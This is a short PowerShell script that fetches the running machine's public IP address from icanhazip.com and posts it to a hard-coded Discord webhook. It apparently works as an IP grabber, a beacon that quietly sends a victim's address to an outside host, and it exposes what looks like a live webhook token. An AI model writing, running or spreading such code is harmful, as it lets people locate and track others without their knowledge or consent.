# Get IP address
$ip = (Invoke-WebRequest -Uri "http://icanhazip.com").Content.Trim()

# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1347662704709472407/9ohSSgF-GCi4B_O5wmmrB0OVZXGO7D8zxEMfDxctVUpgXyI5IlNZ9c-EDgAm7hQEybra"

# Send IP address to Discord Webhook
$headers = @{
    "Content-Type" = "application/json"
}
$body = @{
    "content" = "IP Address: $ip"
} | ConvertTo-Json
Invoke-WebRequest -Uri $webhookUrl -Method POST -Headers $headers -Body $body
